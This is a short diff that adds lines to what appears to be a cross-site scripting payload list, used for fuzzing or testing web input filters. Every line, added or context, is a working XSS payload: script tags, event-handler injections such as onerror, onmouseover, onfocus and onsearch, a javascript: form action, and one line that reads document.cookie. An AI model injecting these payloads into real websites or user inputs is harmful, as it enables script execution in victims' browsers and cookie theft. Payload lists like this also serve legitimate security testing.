@@ -1,3 +1,6 @@
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
+<script>alert(document.cookie)</script>">
 <input onfocus="eval(prompt(1))" autofocus>XSS</input>
 <input onfocus=<svg poster="XSS" onmouseover="eval(atob(alert(1)))">autofocus>
 <input type="search" onsearch=prompt(1) autofocus>
